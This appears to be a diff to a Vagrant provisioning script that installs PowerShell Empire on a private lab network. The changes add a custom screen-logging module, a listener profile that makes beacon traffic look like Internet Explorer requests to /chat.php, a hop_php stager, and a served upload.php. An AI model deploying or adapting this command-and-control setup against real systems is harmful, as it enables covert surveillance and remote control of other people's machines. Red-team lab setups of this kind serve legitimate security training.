@@ -1,10 +1,11 @@
 $empire = <<SCRIPT
 echo "Empire ..."
-cd /vagrant/
+cd /home/vagrant/
 wget -q https://github.com/PowerShellEmpire/Empire/archive/dev.tar.gz
 tar -xzf dev.tar.gz
 rm dev.tar.gz
-cd /vagrant/Empire-dev/setup/
+cp /vagrant/custom/screenlogger.py /home/vagrant/Empire-dev/lib/modules/collection/
+cd /home/vagrant/Empire-dev/setup/
 echo -en "somekey\n" | ./install.sh
 cd ..
 cat > cmd.txt <<EOF
@@ -13,6 +14,7 @@ set Name chat
 set Host http://192.168.33.33:80
 set DefaultLostLimit 0
 set DefaultJitter 1
+set DefaultProfile /chat.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
 run
 usestager hop_php
 set Listener chat
@@ -65,7 +67,7 @@ service nginx start
 service nginx reload
 service nginx status
 cp /vagrant/hopper/chat.php /usr/share/nginx/html/chat.php
-#cp /vagrant/hopper/upload.php /usr/share/nginx/html/upload.php
+cp /vagrant/helpers/upload.php /usr/share/nginx/html/upload.php
 mkdir -p /var/www/chat
 chown www-data:www-data /var/www/chat
 date >> /etc/vagrant_provisioned_at
